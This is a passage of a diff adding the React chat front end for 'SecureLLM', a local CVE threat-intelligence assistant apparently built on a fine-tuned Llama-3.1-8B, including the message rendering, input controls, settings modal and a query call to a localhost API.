+        <div style={{position:'absolute',top:10,left:14,fontSize:'9px',color:'rgba(204,48,16,.3)',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.1em'}}>SCANNING</div>
+        <div style={{position:'absolute',top:8,right:10,fontSize:'8px',color:'rgba(204,48,16,.18)',fontFamily:"'JetBrains Mono',monospace",lineHeight:1.35,textAlign:'right'}}>
+          {['01000001','01000010','01000011','01000100'].map((b,i)=><div key={i}>{b}</div>)}
+        </div>
+        <div className="tri-pulse" style={{marginBottom:'16px',display:'inline-block'}}>
+          <svg width="64" height="56" viewBox="0 0 64 56" fill="none">
+            <path d="M32 3L61 53H3L32 3Z" stroke="#CC3010" strokeWidth="2" fill="rgba(204,48,16,0.1)"/>
+            <text x="32" y="40" textAnchor="middle" fill="#FF4422" fontSize="20" fontWeight="900" fontFamily="'JetBrains Mono',monospace">!</text>
+          </svg>
+        </div>
+        <div style={{fontSize:'24px',fontWeight:800,color:C.text,letterSpacing:'.12em',textTransform:'uppercase',marginBottom:'6px',fontFamily:"'JetBrains Mono',monospace"}}>ATTENTION</div>
+        <div style={{fontSize:'11px',color:C.muted,marginBottom:'3px',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.06em'}}>SECURELLM SYSTEM ONLINE</div>
+        <div style={{fontSize:'10px',color:C.dim,marginBottom:'18px',fontFamily:"'JetBrains Mono',monospace"}}>LLAMA-3.1-8B // 9,992 CVE RECORDS LOADED</div>
+        <div style={{fontSize:'10px',color:C.muted,fontFamily:"'JetBrains Mono',monospace",display:'flex',alignItems:'center',justifyContent:'center',gap:'8px'}}>
+          STATUS <MiniScan/> <span style={{color:'#1DB845'}}>READY</span>
+        </div>
+      </Brackets>
+      <div style={{display:'flex',flexWrap:'wrap',gap:'6px',justifyContent:'center',maxWidth:540,position:'relative',zIndex:1}}>
+        {chips.map((c,i)=>(
+          <button key={i} onClick={()=>onSuggest(c)}
+            style={{padding:'7px 14px',background:'rgba(204,48,16,.05)',border:'1px solid rgba(204,48,16,.28)',borderRadius:'2px',color:C.muted,fontSize:'10px',cursor:'pointer',fontFamily:"'JetBrains Mono',monospace",transition:'all .2s',whiteSpace:'nowrap',textTransform:'uppercase',letterSpacing:'.05em'}}
+            onMouseEnter={e=>{e.currentTarget.style.background='rgba(204,48,16,.14)';e.currentTarget.style.color='#FF4422';e.currentTarget.style.borderColor='rgba(255,68,34,.5)';}}
+            onMouseLeave={e=>{e.currentTarget.style.background='rgba(204,48,16,.05)';e.currentTarget.style.color=C.muted;e.currentTarget.style.borderColor='rgba(204,48,16,.28)';}}>
+            &gt;_ {c}
+          </button>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   CHAT MESSAGES
+═══════════════════════════════════════════════ */
+function TypingIndicator(){
+  return(
+    <div className="msg-in" style={{display:'flex',justifyContent:'flex-start',marginBottom:12,padding:'0 24px'}}>
+      <div style={{background:'#140E09',border:'1px solid rgba(204,48,16,.28)',borderLeft:'3px solid #CC3010',borderRadius:'0 2px 2px 2px',padding:'12px 18px',display:'flex',alignItems:'center',gap:'12px'}}>
+        <div style={{display:'flex',gap:'5px',alignItems:'center'}}>
+          {[0,1,2].map(i=><span key={i} className="dot" style={{width:6,height:6,borderRadius:'2px',background:'#CC3010',display:'inline-block'}}/>)}
+        </div>
+        <span style={{fontSize:'11px',color:C.muted,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.05em'}}>PROCESSING // LLAMA-3.1-8B…</span>
+      </div>
+    </div>
+  );
+}
+
+function FBtn({icon,active,onClick,label}){
+  const [h,setH]=useState(false);
+  const p={copy:['#FF4422','rgba(204,48,16,.14)','rgba(255,68,34,.4)'],up:['#1DB845','rgba(29,184,69,.12)','rgba(29,184,69,.4)'],down:['#FF4422','rgba(255,68,34,.12)','rgba(255,68,34,.4)']}[icon];
+  return(
+    <button onClick={onClick} onMouseEnter={()=>setH(true)} onMouseLeave={()=>setH(false)}
+      style={{background:active?p[1]:'none',border:`1px solid ${active?p[2]:'rgba(204,48,16,.2)'}`,borderRadius:'2px',padding:label?'2px 7px':'3px 5px',color:active?p[0]:h?C.text:C.muted,fontSize:'10px',cursor:'pointer',display:'flex',alignItems:'center',gap:'3px',transition:'all .13s',fontFamily:"'JetBrains Mono',monospace"}}>
+      {icon==='copy'&&label}
+      {icon==='up'&&<svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M3.5 9.5V5.5L5.5 1.5l.7.35V4.5H9.8l-.4 5H3.5zM1 5.5h2.5v4H1V5.5z" stroke="currentColor" strokeWidth="1" strokeLinejoin="round"/></svg>}
+      {icon==='down'&&<svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M7.5 1.5V5.5L5.5 9.5l-.7-.35V6.5H1.2l.4-5H7.5zM10 5.5H7.5v-4H10v4z" stroke="currentColor" strokeWidth="1" strokeLinejoin="round"/></svg>}
+    </button>
+  );
+}
+
+function fmtTime(d){return d.toLocaleTimeString('en-US',{hour:'2-digit',minute:'2-digit',hour12:false});}
+
+function Message({msg,onCopy,feedback,onFeedback,copiedId,compact=false,streamingId=null}){
+  const [scanning,setScanning]=useState(msg.role==='ai');
+  useEffect(()=>{if(msg.role==='ai'){const t=setTimeout(()=>setScanning(false),760);return()=>clearTimeout(t);}},[]);
+  if(msg.role==='user') return(
+    <div className="msg-in" style={{display:'flex',justifyContent:'flex-end',marginBottom:12,padding:'0 24px'}}>
+      <div style={{maxWidth:'68%',background:'rgba(204,48,16,.08)',border:'1px solid rgba(204,48,16,.28)',borderRadius:'2px 2px 0 2px',padding:compact?'6px 10px':'10px 14px'}}>
+        <div style={{fontSize:'9px',color:'rgba(204,48,16,.5)',marginBottom:'5px',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.08em'}}>&gt;_ INPUT // {fmtTime(msg.ts)}</div>
+        <p style={{color:C.text,margin:0,lineHeight:1.65,fontSize:'13px',whiteSpace:'pre-wrap',fontFamily:'Inter,sans-serif'}}>{msg.content}</p>
+      </div>
+    </div>
+  );
+  return(
+    <div className="msg-in" style={{display:'flex',justifyContent:'flex-start',marginBottom:12,padding:'0 24px'}}>
+      <div style={{maxWidth:'85%',background:'#140E09',border:'1px solid rgba(204,48,16,.25)',borderLeft:'3px solid #CC3010',borderRadius:'0 2px 2px 2px',padding:compact?'7px 10px':'12px 14px',position:'relative',overflow:'hidden'}}>
+        {scanning&&<div className="scan-line"/>}
+        <div style={{display:'flex',alignItems:'center',gap:'8px',marginBottom:10,paddingBottom:'8px',borderBottom:'1px solid rgba(204,48,16,.12)'}}>
+          <span style={{fontSize:'10px',color:'rgba(204,48,16,.6)'}}>▶</span>
+          <span style={{fontSize:'10px',fontWeight:700,color:'#CC3010',letterSpacing:'.1em',textTransform:'uppercase',fontFamily:"'JetBrains Mono',monospace"}}>SECURELLM RESPONSE</span>
+          {msg.isDemo&&<span style={{fontSize:'9px',color:C.dim,border:'1px solid rgba(204,48,16,.2)',padding:'1px 4px',fontFamily:"'JetBrains Mono',monospace"}}>DEMO</span>}
+          <span style={{fontSize:'9px',color:C.dim,marginLeft:'auto',fontFamily:"'JetBrains Mono',monospace"}}>{fmtTime(msg.ts)}</span>
+        </div>
+        <div style={{fontSize:'14px'}}>{renderMarkdown(msg.content)}{streamingId===msg.id&&<span className="stream-cursor">▌</span>}</div>
+        <div style={{display:'flex',alignItems:'center',gap:'6px',marginTop:10,paddingTop:8,borderTop:'1px solid rgba(204,48,16,.1)',flexWrap:'wrap'}}>
+          {msg.latency!=null&&<span style={{fontSize:'9px',color:C.dim,fontFamily:"'JetBrains Mono',monospace",flex:1,overflow:'hidden',textOverflow:'ellipsis',whiteSpace:'nowrap'}}>GEN: {(msg.latency/1000).toFixed(1)}s // {msg.tokens.toLocaleString()} TOKENS</span>}
+          <div style={{display:'flex',gap:'3px',flexShrink:0}}>
+            <FBtn icon="copy" active={copiedId===msg.id} onClick={()=>onCopy(msg.id,msg.content)} label={copiedId===msg.id?'[COPIED]':'[COPY]'}/>
+            <FBtn icon="up"   active={feedback[msg.id]==='up'}   onClick={()=>onFeedback(msg.id,'up')}/>
+            <FBtn icon="down" active={feedback[msg.id]==='down'} onClick={()=>onFeedback(msg.id,'down')}/>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   INPUT AREA
+═══════════════════════════════════════════════ */
+function AngToggle({on,onToggle}){
+  return(
+    <div onClick={onToggle} style={{width:28,height:14,background:on?'rgba(204,48,16,.3)':'rgba(204,48,16,.1)',border:`1px solid ${on?'rgba(255,68,34,.5)':'rgba(204,48,16,.25)'}`,position:'relative',cursor:'pointer',transition:'all .2s',borderRadius:'2px',flexShrink:0}}>
+      <div style={{position:'absolute',top:'1px',left:on?'14px':'1px',width:10,height:10,background:on?'#FF4422':'#3C1A08',transition:'all .2s',borderRadius:'1px'}}/>
+    </div>
+  );
+}
+
+function InputArea({value,onChange,onSend,temperature,setTemperature,maxTokens,setMaxTokens,streamEnabled,setStreamEnabled,disabled}){
+  const [focused,setFocused]=useState(false);
+  const taRef=useRef(null);
+  const hChange=e=>{onChange(e.target.value);const ta=taRef.current;if(ta){ta.style.height='auto';ta.style.height=Math.min(ta.scrollHeight,180)+'px';}};
+  const hPaste=e=>{setTimeout(()=>{const ta=taRef.current;if(!ta)return;onChange(ta.value);if(ta){ta.style.height='auto';ta.style.height=Math.min(ta.scrollHeight,180)+'px';}},0);};
+  const hKey=e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();if(value.trim()&&!disabled)onSend();}};
+  return(
+    <div style={{padding:'10px 24px 16px',background:'#0D0906',borderTop:'1px solid rgba(204,48,16,.2)',flexShrink:0}}>
+      <div style={{marginBottom:'5px',fontSize:'10px',color:'rgba(204,48,16,.4)',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.04em'}}>ROOT@SECURELLM:~#</div>
+      <div className={`inp-wrap ${focused?'on':''}`}>
+        <div style={{background:'#140E09',padding:'10px 12px',display:'flex',gap:'10px',alignItems:'flex-end'}}>
+          <textarea ref={taRef} value={value} onChange={hChange} onInput={hChange} onPaste={hPaste} onKeyDown={hKey}
+            onFocus={()=>setFocused(true)} onBlur={()=>setFocused(false)}
+            disabled={disabled} rows={1}
+            placeholder="Ask about any CVE, threat, or vulnerability…"
+            style={{flex:1,background:'none',border:'none',outline:'none',color:C.text,fontSize:'13px',lineHeight:1.6,resize:'none',fontFamily:'Inter,sans-serif',minHeight:'22px',maxHeight:'180px',overflowY:'auto'}}
+          />
+          <button onClick={onSend} disabled={!value.trim()||disabled}
+            style={{padding:'6px 14px',background:value.trim()&&!disabled?'#CC3010':'rgba(204,48,16,.08)',border:`1px solid ${value.trim()&&!disabled?'#FF4422':'rgba(204,48,16,.2)'}`,cursor:value.trim()&&!disabled?'pointer':'not-allowed',color:value.trim()&&!disabled?C.text:C.dim,fontSize:'10px',fontWeight:700,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.08em',textTransform:'uppercase',borderRadius:'2px',flexShrink:0,transition:'all .18s'}}>
+            EXECUTE
+          </button>
+        </div>
+      </div>
+      <div style={{display:'flex',alignItems:'center',gap:'10px',marginTop:'7px',fontSize:'9px',fontFamily:"'JetBrains Mono',monospace",color:C.dim,flexWrap:'wrap'}}>
+        <span>TEMP</span>
+        <input type="range" min=".1" max="1" step=".1" value={temperature} onChange={e=>setTemperature(parseFloat(e.target.value))} className="slider" style={{width:64}}/>
+        <span style={{color:C.muted,minWidth:18}}>{temperature.toFixed(1)}</span>
+        <span style={{color:'rgba(204,48,16,.2)'}}>|</span>
+        <span>TOKENS</span>
+        <select value={maxTokens} onChange={e=>setMaxTokens(parseInt(e.target.value))}
+          style={{background:'rgba(204,48,16,.06)',border:'1px solid rgba(204,48,16,.2)',color:C.muted,fontSize:'10px',padding:'1px 5px',fontFamily:"'JetBrains Mono',monospace",cursor:'pointer',outline:'none',borderRadius:'2px'}}>
+          {[100,200,500,1000].map(n=><option key={n} value={n}>{n}</option>)}
+        </select>
+        <span style={{color:'rgba(204,48,16,.2)'}}>|</span>
+        <span>STREAM</span>
+        <AngToggle on={streamEnabled} onToggle={()=>setStreamEnabled(v=>!v)}/>
+        <span style={{marginLeft:'auto',color:'rgba(204,48,16,.15)'}}>⏎ EXEC · ⇧⏎ NEWLINE</span>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   SETTINGS MODAL
+═══════════════════════════════════════════════ */
+function SettingsModal({onClose}){
+  return(
+    <div onClick={onClose} style={{position:'fixed',inset:0,background:'rgba(0,0,0,.8)',zIndex:1001,display:'flex',alignItems:'center',justifyContent:'center'}}>
+      <div onClick={e=>e.stopPropagation()} style={{background:C.bg2,border:`1px solid ${C.brd2}`,padding:'24px',width:'420px',maxHeight:'80vh',overflowY:'auto'}}>
+        <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:'20px',paddingBottom:'12px',borderBottom:`1px solid ${C.brd}`}}>
+          <div style={{display:'flex',alignItems:'center',gap:'8px'}}>
+            <span style={{color:C.red,fontSize:'12px'}}>▶</span>
+            <span style={{fontSize:'12px',fontWeight:700,color:C.text,fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.1em',textTransform:'uppercase'}}>// SETTINGS</span>
+          </div>
+          <button onClick={onClose} style={{background:'none',border:`1px solid ${C.brd}`,cursor:'pointer',padding:'2px 8px',color:C.muted,fontSize:'13px',fontFamily:"'JetBrains Mono',monospace"}}>[ × ]</button>
+        </div>
+        <div style={{marginBottom:'16px'}}>
+          <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.14em',textTransform:'uppercase',fontWeight:700,marginBottom:'8px',fontFamily:"'JetBrains Mono',monospace"}}>API ENDPOINT</div>
+          <div style={{background:'rgba(0,0,0,.3)',border:`1px solid ${C.brd}`,padding:'8px 12px',fontFamily:"'JetBrains Mono',monospace",fontSize:'11px',color:C.muted}}>http://localhost:8000/query</div>
+          <div style={{fontSize:'10px',color:C.dim,marginTop:'5px',fontFamily:"'JetBrains Mono',monospace"}}>POST · message · history · max_new_tokens · temperature · top_p · stream</div>
+        </div>
+        <div style={{marginBottom:'16px'}}>
+          <div style={{fontSize:'9px',color:C.dim,letterSpacing:'.14em',textTransform:'uppercase',fontWeight:700,marginBottom:'8px',fontFamily:"'JetBrains Mono',monospace"}}>MODEL CONFIG</div>
+          {[['Model','Meta-Llama-3.1-8B-Instruct'],['Fine-tuning','LoRA (4-bit NF4)'],['Training data','9,992 NVD CVE records'],['Device','RTX 4050 · CUDA FP16'],['Context','4,096 tokens'],['Generation','~60–130s response']].map(([k,v])=>(
+            <div key={k} style={{display:'flex',justifyContent:'space-between',padding:'6px 0',borderBottom:`1px solid ${C.brd}`,gap:'16px'}}>
+              <span style={{fontSize:'10px',color:C.dim,fontFamily:"'JetBrains Mono',monospace"}}>{k}</span>
+              <span style={{fontSize:'10px',color:C.muted,textAlign:'right',fontFamily:"'JetBrains Mono',monospace"}}>{v}</span>
+            </div>
+          ))}
+        </div>
+        <div style={{padding:'12px',background:'rgba(204,48,16,.04)',border:`1px solid ${C.brd}`}}>
+          <div style={{fontSize:'9px',color:C.red,fontWeight:700,marginBottom:'6px',fontFamily:"'JetBrains Mono',monospace",letterSpacing:'.1em'}}>// ABOUT</div>
+          <p style={{fontSize:'11px',color:C.muted,lineHeight:1.65,fontFamily:'Inter,sans-serif'}}>SecureLLM is a local threat intelligence assistant. All processing is done on your machine — no data leaves your environment.</p>
+        </div>
+      </div>
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   APP
+═══════════════════════════════════════════════ */
+function App(){
+  const [messages,setMessages]=useState([]);
+  const [activeConv,setActiveConv]=useState(null);
+  const [input,setInput]=useState('');
+  const [typing,setTyping]=useState(false);
+  const [error,setError]=useState(null);
+  const [cveData,setCveData]=useState(null);
+  const [cvePanelOpen,setCvePanelOpen]=useState(true);
+  const [temp,setTemp]=useState(0.2);
+  const [maxTok,setMaxTok]=useState(500);
+  const [stream,setStream]=useState(false);
+  const [copiedId,setCopiedId]=useState(null);
+  const [feedback,setFeedback]=useState({});
+  const msgsRef=useRef(null);
+  const [tweaks,setTweak]=useTweaks(TWEAK_DEFAULTS);
+  const [streamingId,setStreamingId]=useState(null);
+  const [showSettings,setShowSettings]=useState(false);
+
+  useEffect(()=>{if(msgsRef.current)msgsRef.current.scrollTop=msgsRef.current.scrollHeight;},[messages,typing]);
+
+  const send=async(text)=>{
+    const content=(text||input).trim();
+    if(!content||typing)return;
+    const userMsg={id:Date.now()+'',role:'user',content,ts:new Date()};
+    setMessages(prev=>[...prev,userMsg]);
+    setInput('');setTyping(true);setError(null);
+    const ta=document.querySelector('textarea');if(ta)ta.style.height='auto';
+    const history=messages.map(m=>({role:m.role==='ai'?'assistant':'user',content:m.content}));
+    let resp=null,isDemo=false;
+    try{
+      const res=await fetch('http://localhost:8000/query',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({message:content,history,max_new_tokens:maxTok,temperature:temp,top_p:0.9,stream:false}),signal:AbortSignal.timeout(180000)});
+      if(!res.ok)throw new Error(`HTTP ${res.status}`);
+      resp=await res.json();
+    }catch{
+      isDemo=true;
+      const demo=getDemoResponse(content);
+      await new Promise(r=>setTimeout(r,1300+Math.random()*1400));
+      resp={response:demo.response,latency_ms:demo.latency_ms};
+      setError('API UNREACHABLE: localhost:8000 — SHOWING DEMO RESPONSE');
+    }
+    setTyping(false);
+    const msgId=(Date.now()+1)+'';
+    if(stream){
+      const aiMsg={id:msgId,role:'ai',content:'',ts:new Date(),latency:null,tokens:0,isDemo};
+      setMessages(prev=>[...prev,aiMsg]);setStreamingId(msgId);
+      const words=resp.response.split(' ');let built='';
+      for(let i=0;i<words.length;i++){built+=(i>0?' ':'')+words[i];setMessages(prev=>prev.map(m=>m.id===msgId?{...m,content:built}:m));await new Promise(r=>setTimeout(r,20+Math.random()*12));}
+      setStreamingId(null);
+      setMessages(prev=>prev.map(m=>m.id===msgId?{...m,latency:resp.latency_ms,tokens:estimateTokens(resp.response)}:m));
+    }else{
+      setMessages(prev=>[...prev,{id:msgId,role:'ai',content:resp.response,ts:new Date(),latency:resp.latency_ms,tokens:estimateTokens(resp.response),isDemo}]);
+    }
+    const cves=extractCVEs(resp.response);
+    if(cves.length&&CVE_DATABASE[cves[0]]){setCveData(CVE_DATABASE[cves[0]]);setCvePanelOpen(true);}
+  };
+
+  const handleCopy=(id,text)=>{
+    navigator.clipboard.writeText(text).catch(()=>{const ta=document.createElement('textarea');ta.value=text;document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);});
+    setCopiedId(id);setTimeout(()=>setCopiedId(null),2000);
+  };
+  const clearAll=()=>{setMessages([]);setCveData(null);setError(null);setActiveConv(null);};
+
+  return(
+    <div style={{height:'100vh',display:'flex',flexDirection:'column',background:'#0D0906',color:C.text,overflow:'hidden'}}>
+      <TopNav onNewChat={clearAll} cvePanelOpen={cvePanelOpen} onToggleCVE={()=>setCvePanelOpen(v=>!v)} onSettings={()=>setShowSettings(true)}/>
+      {error&&(
+        <div style={{background:'rgba(204,48,16,.08)',borderBottom:'1px solid rgba(204,48,16,.25)',padding:'6px 24px',display:'flex',alignItems:'center',gap:'9px',color:'#FF7070',fontSize:'10px',flexShrink:0,fontFamily:"'JetBrains Mono',monospace"}}>
+          <span style={{color:'#FF4422'}}>!!</span>{error}
+          <button onClick={()=>setError(null)} style={{marginLeft:'auto',background:'none',border:'none',color:'#FF4422',cursor:'pointer',fontSize:'14px',fontFamily:'inherit'}}>×</button>
+        </div>
+      )}
+      <div style={{flex:1,display:'flex',overflow:'hidden'}}>
+        <Sidebar activeConvId={activeConv} onSelectConv={id=>{
+          const conv=MOCK_CONVERSATIONS.find(c=>c.id===id);
+          setActiveConv(id);setError(null);
+          if(conv){
+            const demo=getDemoResponse(conv.title);
+            const userMsg={id:'demo-u-'+id,role:'user',content:conv.title,ts:conv.ts};
+            const aiMsg={id:'demo-a-'+id,role:'ai',content:demo.response,ts:new Date(conv.ts.getTime()+demo.latency_ms),latency:demo.latency_ms,tokens:estimateTokens(demo.response),isDemo:true};
+            setMessages([userMsg,aiMsg]);
+            const cves=extractCVEs(demo.response);
+            if(cves.length&&CVE_DATABASE[cves[0]]){setCveData(CVE_DATABASE[cves[0]]);setCvePanelOpen(true);}
+            else setCveData(null);
+          }else{setMessages([]);setCveData(null);}
+        }} onNewChat={clearAll}/>
+        <div style={{flex:1,display:'flex',flexDirection:'column',overflow:'hidden',minWidth:0,position:'relative'}}>
+          <MatrixRain opacity={tweaks.rainOpacity}/>
+          <style dangerouslySetInnerHTML={{__html:`:root{--red:${tweaks.primaryColor};--red2:${PALETTE_HL[tweaks.primaryColor]||'#FF4422'};--brd:${tweaks.primaryColor}47;--brd2:${PALETTE_HL[tweaks.primaryColor]||'#FF4422'}8C;--rg:${tweaks.primaryColor}59}${!tweaks.showScanlines?'body::after{display:none}':''}`}}/>
+          <div ref={msgsRef} className="chat-bg" style={{flex:1,overflowY:'auto',paddingTop:18,position:'relative',zIndex:1}}>
+            {messages.length===0&&!typing
+              ?<EmptyState onSuggest={send}/>
+              :<>
+                {messages.map(m=><Message key={m.id} msg={m} onCopy={handleCopy} feedback={feedback} onFeedback={(id,t)=>setFeedback(p=>({...p,[id]:p[id]===t?null:t}))} copiedId={copiedId} compact={tweaks.compact} streamingId={streamingId}/>)}
+                {typing&&<TypingIndicator/>}
+                <div style={{height:16}}/>
+              </>
+            }
+          </div>
+          <InputArea value={input} onChange={setInput} onSend={send} temperature={temp} setTemperature={setTemp} maxTokens={maxTok} setMaxTokens={setMaxTok} streamEnabled={stream} setStreamEnabled={setStream} disabled={typing}/>
+        </div>
+        <CVEPanel cveData={cveData} isCollapsed={!cvePanelOpen} onToggle={()=>setCvePanelOpen(false)}/>
+      </div>
+      <TweaksPanel>
+        <TweakSection label="Theme"/>
+        <TweakColor label="Primary color" value={tweaks.primaryColor}
+          options={['#CC3010','#CC6010','#AA2080']}
+          onChange={v=>setTweak('primaryColor',v)}/>
+        <TweakSlider label="Binary rain" value={tweaks.rainOpacity} min={0} max={0.09} step={0.005}
+          onChange={v=>setTweak('rainOpacity',v)}/>
+        <TweakToggle label="CRT scanlines" value={tweaks.showScanlines}
+          onChange={v=>setTweak('showScanlines',v)}/>
+        <TweakToggle label="Compact mode" value={tweaks.compact}
+          onChange={v=>setTweak('compact',v)}/>
+      </TweaksPanel>
+      {showSettings&&<SettingsModal onClose={()=>setShowSettings(false)}/>}
+    </div>
+  );
+}
+
+ReactDOM.createRoot(document.getElementById('root')).render(<App/>);
+</script>
+</body>
+</html>
